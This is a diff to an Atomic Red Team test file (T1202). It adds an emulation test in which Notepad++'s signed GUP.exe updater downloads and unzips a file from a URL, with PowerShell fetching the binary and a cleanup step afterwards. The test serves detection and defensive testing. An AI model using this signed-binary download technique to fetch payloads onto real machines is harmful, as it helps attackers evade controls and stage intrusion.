@@ -58,3 +58,41 @@ atomic_tests:
     command: |
       conhost.exe "#{process}"
     name: command_prompt
+- name: Arbitrary file download using the Notepad++ GUP.exe binary
+  description: |-
+    GUP is an open source signed binary used by Notepad++ for software updates, and can be used to download arbitrary files(.zip) from internet/github.
+    [Reference](https://x.com/nas_bench/status/1535322182863179776?s=20)
+    Upon execution, a sample zip file will be downloaded to C:\Temp\Sample folder
+  supported_platforms:
+  - windows
+  input_arguments:
+    target_file_url:
+      description: 'URL of the target ZIP file (Eg: https://example.com/test.zip)'
+      type: url
+      default: https://getsamplefiles.com/download/zip/sample-1.zip
+    working_dir:
+      description: Mention the directory where GUP.exe & it's dependecies exists exists
+      type: path
+      default: PathToAtomicsFolder\T1202\bin\
+    gup_executable:
+      description: GUP is an open source signed binary used by Notepad++ for software updates
+      type: String
+      default: PathToAtomicsFolder\T1202\bin\GUP.exe
+    target_file_sha256:
+      description: SHA256 value of target ZIP file
+      type: string
+      default: AACC269929EB3813429F4D15FB45ADE9C7D0276B55421817F052A3ECB366B2E6
+  dependency_executor_name: powershell
+  dependencies:
+  - description: Gup.exe binary must exist on disk at specified location (#{gup_executable})
+    prereq_command: if (Test-Path "#{gup_executable}") {exit 0} else {exit 1}
+    get_prereq_command: |-
+      New-Item -Type Directory (split-path "#{gup_executable}") -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1202/src/GUP.exe" -OutFile "#{gup_executable}"
+  executor:
+    command: |-
+      cd #{working_dir}
+      GUP.exe -unzipTo "" "C:\Temp" "Sample #{target_file_url} #{target_file_sha256}"
+    cleanup_command: rmdir /s /q "C:\Temp\Sample"
+    name: command_prompt
+    elevation_required: true
